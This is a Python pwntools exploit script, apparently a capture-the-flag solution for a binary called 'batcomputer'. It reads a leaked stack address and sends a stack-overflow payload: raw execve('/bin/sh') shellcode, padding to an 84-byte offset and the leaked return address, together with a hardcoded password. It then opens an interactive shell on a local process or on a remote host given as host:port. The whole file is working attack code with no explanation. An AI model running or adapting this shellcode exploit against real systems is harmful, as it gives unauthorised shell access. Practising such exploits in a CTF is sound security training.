#!/usr/bin/env python3

from pwn import context, p64, remote, sys

context.binary = 'batcomputer'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'It was very hard, but Alfred managed to locate him: ')
    command_addr = int(p.recvline().decode(), 16)

    offset = 84

    shellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05'

    payload  = shellcode
    payload += b'A' * (offset - len(payload))
    payload += p64(command_addr)

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b"Ok. Let's do this. Enter the password: ", b'b4tp@$$w0rd!')
    p.sendlineafter(b'Enter the navigation commands: ', payload)

    p.sendlineafter(b'> ', b'3')
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
